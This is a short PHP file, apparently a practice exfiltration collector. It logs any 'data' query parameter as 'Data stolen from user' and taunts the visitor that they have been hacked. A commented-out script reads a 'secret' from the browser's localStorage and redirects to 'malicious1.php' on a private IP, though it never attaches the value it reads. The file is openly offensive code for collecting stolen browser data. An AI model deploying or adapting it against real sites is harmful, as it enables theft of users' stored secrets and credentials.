<?php
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    echo "May bi hack r";
    error_log("Data stolen from user: " . $_GET['data']);
}
?>

<!-- <script>
var data = localStorage.getItem('secret');
window.location.href = 'http://192.168.43.48:9999/malicious1.php'
</script> -->

